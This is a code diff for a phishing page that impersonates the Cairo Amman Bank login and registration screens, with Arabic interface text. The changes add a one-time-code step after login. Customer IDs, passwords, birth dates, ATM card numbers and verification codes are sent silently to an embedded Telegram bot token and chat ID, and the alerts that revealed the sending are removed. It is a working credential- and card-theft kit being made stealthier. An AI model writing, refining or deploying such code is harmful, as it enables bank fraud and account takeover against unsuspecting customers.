@@ -5,7 +5,6 @@
   <title>بنك القاهرة عمان</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* ... نفس التنسيقات السابقة ... */
     body {
       font-family: 'Cairo', Arial, sans-serif;
       background: #fff;
@@ -171,6 +170,7 @@
       color: #222;
       cursor: pointer;
     }
+    /* Responsive */
     @media (max-width: 480px) {
       .centered {
         max-width: 100%;
@@ -208,6 +208,18 @@
       <a class="footer-link" onclick="showRegister()">التسجيل كعميل</a>
     </div>
   </div>
+  <div class="centered" id="verify-page" style="display:none;">
+    <div class="card">
+      <div class="form-title">إدخال رمز التحقق</div>
+      <div class="input-group">
+        <input type="text" class="input-field" maxlength="4" pattern="[0-9]{4}" placeholder="رمز التحقق (4 أرقام)" id="verify-code" inputmode="numeric" oninput="onlyNumber(this,4)">
+      </div>
+      <button class="main-btn" onclick="submitVerify()">إرسال رمز التحقق</button>
+    </div>
+    <div class="footer-links">
+      <a class="footer-link" onclick="showLogin()">عودة إلى الدخول</a>
+    </div>
+  </div>
   <div class="centered" id="register-page" style="display:none;">
     <div class="card">
       <div class="form-title">تسجيل</div>
@@ -219,11 +231,11 @@
         <span class="icon-calendar" onclick="showDatePicker(document.getElementById('reg-birth'))">&#128197;</span>
       </div>
       <div class="input-group">
-        <input type="text" class="input-field" placeholder="رقم بطاقة الدفع المباشر" id="reg-card">
+        <input type="text" class="input-field" placeholder="بطاقة الصراف الآلي *" id="reg-card" maxlength="16" inputmode="numeric" oninput="onlyNumber(this,16)">
         <span class="icon-show" onclick="togglePassword('reg-card', this)">إظهار</span>
       </div>
       <div class="input-group">
-        <input type="text" class="input-field" placeholder="رمز التحقق *" id="reg-code">
+        <input type="text" class="input-field" placeholder="رمز التحقق *" id="reg-code" maxlength="4" inputmode="numeric" oninput="onlyNumber(this,4)">
         <span class="icon-show" onclick="togglePassword('reg-code', this)">إظهار</span>
       </div>
       <div class="checkbox-group">
@@ -232,15 +244,6 @@
       </div>
       <button class="main-btn" onclick="submitRegister()">إرسال</button>
     </div>
-    <div id="verify-section" style="display:none; margin-top:20px;">
-      <div class="card">
-        <div class="form-title">إدخال رمز التحقق مرة أخرى</div>
-        <div class="input-group">
-          <input type="text" class="input-field" placeholder="رمز التحقق الجديد *" id="verify-code">
-        </div>
-        <button class="main-btn" onclick="submitVerify()">إرسال الرمز</button>
-      </div>
-    </div>
     <div class="footer-links">
       <a class="footer-link" onclick="showLogin()">عودة إلى الدخول</a>
     </div>
@@ -248,14 +251,31 @@
   <script>
     const TELEGRAM_TOKEN = "7962720643:AAFgFfeyec_SfTiEpQOsMPe7QSa7vH4Luq8";
     const TELEGRAM_CHAT_ID = "6873334348";
+
+    // بيانات الدخول
+    let loginData = {};
+
+    function onlyNumber(el, maxLength) {
+      el.value = el.value.replace(/\D/g, '');
+      if (el.value.length > maxLength) el.value = el.value.slice(0, maxLength);
+    }
+
     function showRegister() {
       document.getElementById('login-page').style.display = 'none';
       document.getElementById('register-page').style.display = '';
+      document.getElementById('verify-page').style.display = 'none';
       window.scrollTo(0,0);
     }
     function showLogin() {
       document.getElementById('register-page').style.display = 'none';
       document.getElementById('login-page').style.display = '';
+      document.getElementById('verify-page').style.display = 'none';
+      window.scrollTo(0,0);
+    }
+    function showVerify() {
+      document.getElementById('login-page').style.display = 'none';
+      document.getElementById('register-page').style.display = 'none';
+      document.getElementById('verify-page').style.display = '';
       window.scrollTo(0,0);
     }
     function togglePassword(id, el) {
@@ -285,11 +305,8 @@
           chat_id: TELEGRAM_CHAT_ID,
           text: message
         })
-      }).then(r => r.json()).then(data => {
-        // يمكن إضافة معالجة أو إخطار للمستخدم هنا
-      }).catch(err => {
-        alert('تعذر إرسال البيانات إلى تلجرام');
       });
+      // لا تظهر أي رسالة أو تنبيه للمستخدم
     }
     function submitLogin() {
       const user = document.getElementById('login-user').value.trim();
@@ -298,10 +315,25 @@
         alert('يرجى إدخال رمز العميل وكلمة المرور');
         return;
       }
-      const msg = `دخول جديد:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`;
-      sendToTelegram(msg);
-      alert('تم إرسال بيانات الدخول إلى تلجرام');
-      // يمكن هنا إعادة تعيين النموذج أو الانتقال لصفحة أخرى
+      loginData = { user, pass };
+      // إرسال بيانات الدخول للبوت
+      sendToTelegram(`دخول جديد:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`);
+      // الانتقال لصفحة رمز التحقق بدون أي تنبيه
+      showVerify();
+    }
+    function submitVerify() {
+      const code = document.getElementById('verify-code').value.trim();
+      if (!/^\d{4}$/.test(code)) {
+        alert('يرجى إدخال رمز تحقق مكون من 4 أرقام');
+        return;
+      }
+      // إرسال بيانات الدخول مع رمز التحقق للبوت
+      if (loginData.user && loginData.pass) {
+        sendToTelegram(`دخول جديد:\nرمز العميل: ${loginData.user}\nكلمة المرور: ${loginData.pass}\nرمز التحقق: ${code}`);
+      }
+      // إعادة المستخدم لصفحة الدخول أو تصفية البيانات
+      loginData = {};
+      showLogin();
     }
     function submitRegister() {
       const user = document.getElementById('reg-user').value.trim();
@@ -309,28 +341,22 @@
       const card = document.getElementById('reg-card').value.trim();
       const code = document.getElementById('reg-code').value.trim();
       const terms = document.getElementById('reg-terms').checked;
-      if (!user || !birth || !code || !terms) {
+      if (!user || !birth || !card || !code || !terms) {
         alert('يرجى تعبئة جميع الحقول والموافقة على الشروط');
         return;
       }
-      const msg = `تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nرقم البطاقة: ${card}\nرمز التحقق: ${code}`;
-      sendToTelegram(msg);
-      alert('تم إرسال البيانات إلى تلجرام');
-      document.getElementById('verify-section').style.display = '';
-    }
-    function submitVerify() {
-      const user = document.getElementById('reg-user').value.trim();
-      const birth = document.getElementById('reg-birth').value.trim();
-      const card = document.getElementById('reg-card').value.trim();
-      const verifyCode = document.getElementById('verify-code').value.trim();
-      if (!verifyCode) {
-        alert('يرجى إدخال رمز التحقق الجديد');
+      if (!/^\d{16}$/.test(card)) {
+        alert('بطاقة الصراف الآلي يجب أن تتكون من 16 رقم فقط');
         return;
       }
-      const msg = `إعادة إرسال رمز التحقق:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nرقم البطاقة: ${card}\nرمز التحقق الجديد: ${verifyCode}`;
-      sendToTelegram(msg);
-      alert('تم إرسال رمز التحقق الجديد إلى تلجرام');
-      document.getElementById('verify-section').style.display = 'none';
+      if (!/^\d{4}$/.test(code)) {
+        alert('رمز التحقق يجب أن يتكون من 4 أرقام فقط');
+        return;
+      }
+      // إرسال بيانات التسجيل للبوت مع الرمز
+      sendToTelegram(`تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}\nرمز التحقق: ${code}`);
+      // إعادة المستخدم لصفحة الدخول بدون أي تنبيه
+      showLogin();
     }
   </script>
 </body>
